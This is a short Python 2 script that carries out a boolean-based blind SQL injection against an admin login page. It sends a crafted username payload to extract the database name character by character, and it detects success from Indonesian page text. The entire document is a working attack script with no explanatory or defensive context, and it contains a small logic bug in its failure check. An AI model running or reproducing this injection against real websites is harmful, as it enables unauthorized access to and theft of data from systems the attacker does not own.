import requests
import sys

url = "https://asd.com/blog/admin-login.php"

for i in range(1, 10):
	for c in range(0x20, 0x7f):
		username = "xyz' OR BINARY substring(database(), %d, 1) = '%s' -- " % (i, chr(c))
		password = 12345
		form = {'username' : username, 'password' : password, 'submit' : 'Login'}
		response = requests.post(url, data=form)

		if "halaman admin" in response.text:
			status = True
		elif "username dan password salah":
			status = False

		if status:
			sys.stdout.write(chr(c))
			sys.stdout.flush()
			break
print ''